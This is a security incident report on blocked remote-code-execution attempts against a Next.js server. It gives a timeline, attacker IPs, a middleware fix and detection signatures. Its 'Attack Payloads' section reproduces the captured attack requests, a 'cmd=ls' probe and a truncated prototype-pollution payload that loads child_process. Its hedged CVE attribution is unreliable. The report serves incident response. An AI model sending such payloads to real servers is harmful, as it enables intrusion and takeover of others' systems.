# Security Incident Report: Next.js Server Action RCE Attack

**Date:** January 16, 2026
**Status:** Mitigated
**Severity:** Critical (attempted Remote Code Execution)
**Target:** app.socratics.ai (Agora)

---

## Executive Summary

Between 00:39 UTC and 04:46 UTC on January 16, 2026, automated scanners originating from Microsoft Azure infrastructure (`69.15.19.0/24`) attempted to exploit a Next.js Server Actions vulnerability to achieve Remote Code Execution (RCE) on the Agora production server.

The attack was **blocked** by middleware protections deployed at 04:17 UTC. No code execution occurred.

---

## Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| 00:39:32 | First ReferenceError detected - scanner probing began |
| 02:00:06 | POST to static JS file caused server action processing crash |
| 02:03:06 | 403 errors begin for all POST requests (App Service protection triggered) |
| 03:39:47 | Major attack wave - POST to `/projects` with 10s hang |
| 04:09:47 | Mitigation deployed (middleware update) |
| 04:12:47 | Scanner returned before deployment completed |
| 04:17:00 | New middleware fully active |
| 04:46:13 | **Scanner returned - attack BLOCKED, payload captured** |

---

## Attacker Infrastructure

- **IP Range:** `69.15.19.0/24` (33 unique IPs observed)
- **Owner:** Microsoft Corporation (Azure Cloud)
- **Location:** Frankfurt, Germany (RIPE NCC)
- **WHOIS:**
  ```
  inetnum:  69.15.0.0 - 69.15.127.255
  netname:  cloud
  abuse:    abuse@microsoft.com
  mnt-by:   MICROSOFT-MAINT
  ```
- **User-Agent:** `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36`

---

## Attack Payloads

### Payload 1: Command Injection Probe

**Target:** `/_next/static/chunks/jquery-3.6.0.42879de7b8087bc9.js`
**Method:** POST
**Time:** 04:46:13 UTC

```http
POST /_next/static/chunks/jquery-3.6.0.42879de7b8087bc9.js HTTP/1.1
Host: app.socratics.ai
Content-Length: 6
Next-Action: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox

cmd=ls
```

**Result:** `400 Bad Request` (BLOCKED)

---

### Payload 2: Prototype Pollution + RCE Exploit

**Target:** `/projects`
**Method:** POST
**Time:** 04:46:14 UTC
**Content-Type:** `multipart/form-data; boundary=----WebKitFormBoundaryA7k3fQ92mLpXyTgB`
**Content-Length:** 1574 bytes

```http
POST /projects HTTP/1.1
Host: app.socratics.ai
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA7k3fQ92mLpXyTgB
Content-Length: 1574
Next-Action: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox

------WebKitFormBoundaryA7k3fQ92mLpXyTgB
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "(async()=>{const a=await import('node:http'),b=await import('node:url'),c=await import('node:child_process'),d=a.Server.prototype.emit,e='content-security-policy';a.Server.prototype.emit=function(f,...g){if(f==='request'){const[h,i]=g,j=b.parse(h.url,true).pat..."
  }
}
------WebKitFormBoundaryA7k3fQ92mLpXyTgB--
```

**Result:** `400 Bad Request` (BLOCKED)

---

## Attack Analysis

### Vulnerability Targeted

The attack exploits **Next.js Server Actions** vulnerability, likely related to:
- **CVE-2024-34351** - SSRF via Host header in Server Actions
- **CVE-2024-39693** - Prototype pollution in Server Actions

### Attack Technique

1. **Server Action Spoofing:** Adds `Next-Action: x` header to trick Next.js into processing the request as a server action

2. **Prototype Pollution:** Uses `"then": "$1:__proto__:then"` to pollute the Object prototype chain

3. **Remote Code Execution:** Attempts to import and execute Node.js modules:
   ```javascript
   const a = await import('node:http');
   const b = await import('node:url');
   const c = await import('node:child_process');  // RCE!
   ```

4. **Server Hijacking:** Overrides `Server.prototype.emit` to intercept all HTTP requests

### Why It Caused 403 Errors (Before Mitigation)

When the malformed server action requests reached Next.js:
1. Next.js attempted to find the server action handler
2. Module initialization triggered `ReferenceError: Cannot access 'i' before initialization`
3. Repeated crashes corrupted internal state
4. Azure App Service frontend detected unhealthy backend
5. App Service began returning 403 for POST requests (protective measure)

---

## Mitigation Implemented

### Middleware Protection (`src/middleware.ts`)

```typescript
// Block requests with Next-Action header to non-API routes
// We don't use server actions, so any Next-Action header is suspicious
if (isServerActionRequest && !isApiRoute) {
  console.log("[Middleware] Blocked server action request", {
    pathname,
    ip,
    nextAction: nextAction?.substring(0, 50),
  });
  return new NextResponse(JSON.stringify({ error: "Invalid request" }), {
    status: 400,
    headers: { "Content-Type": "application/json" },
  });
}
```

### Key Protections

1. **Server Action Blocking:** Rejects any request with `Next-Action` header to non-API routes
2. **Payload Logging:** Captures full headers and body (first 500 chars) for forensic analysis
3. **Static File Protection:** Blocks POST requests to `/_next/static/*` paths

---

## Indicators of Compromise (IOCs)

### IP Addresses (69.15.19.0/24)
```
69.15.19.72, 69.15.19.73, 69.15.19.74, 69.15.19.77, 69.15.19.78, 69.15.19.79,
69.15.19.102, 69.15.19.103, 69.15.19.104, 69.15.19.105, 69.15.19.106, 69.15.19.107,
69.15.19.110, 69.15.19.111, 69.15.19.113, 69.15.19.134, 69.15.19.135, 69.15.19.137,
69.15.19.138, 69.15.19.139, 69.15.19.141, 69.15.19.142, 69.15.19.143, 69.15.19.166,
69.15.19.169, 69.15.19.171, 69.15.19.173, 69.15.19.174, 69.15.19.175, 69.15.19.177,
69.15.19.198, 69.15.19.200, 69.15.19.201, 69.15.19.202, 69.15.19.203, 69.15.19.204,
69.15.19.207, 69.15.19.209, 69.15.19.230, 69.15.19.231, 69.15.19.232, 69.15.19.234,
69.15.19.235, 69.15.19.236, 69.15.19.238, 69.15.19.239, 69.15.19.240, 69.15.19.241
```

### Request Signatures
- `Next-Action: x` header
- POST to `/_next/static/chunks/*.js`
- POST to page routes (non-API)
- Body containing `__proto__`, `child_process`, `node:http`

### Probing Paths (Vulnerability Scanner Fingerprint)
```
/blogs/index.html
/buy/index.html
/cart/index.html
/goods/index.html
/information/index.html
/mails/index.html
/more/index.html
/news/index.html
/shoppings/index.html
/shops/index.html
```

---

## Recommendations

1. **Keep Next.js Updated:** Ensure running latest patched version
2. **Monitor for Server Action Abuse:** Log and alert on unexpected `Next-Action` headers
3. **Consider WAF Rules:** Block requests with `Next-Action` header at CDN/WAF level
4. **Report to Microsoft:** These attacks originate from Azure infrastructure - consider reporting to `abuse@microsoft.com`

---

## References

- [CVE-2024-34351 - Next.js Server Actions SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-34351)
- [CVE-2024-39693 - Next.js Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2024-39693)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [OWASP Prototype Pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)

---

*Report generated: January 16, 2026*
